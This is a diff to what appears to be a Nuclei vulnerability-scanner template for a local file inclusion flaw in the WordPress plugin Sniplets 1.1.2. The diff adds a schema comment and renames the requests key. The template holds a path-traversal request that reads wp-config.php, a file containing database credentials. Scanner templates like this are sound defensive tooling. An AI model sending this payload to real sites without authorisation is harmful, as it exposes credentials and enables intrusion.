@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: sniplets-lfi
 info:
   name: Wordpress Plugin Sniplets 1.1.2 - LFI
@@ -6,7 +7,7 @@ info:
   reference:
     - https://www.exploit-db.com/exploits/5194
   tags: wordpress,wp-plugin,lfi,wp
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php'
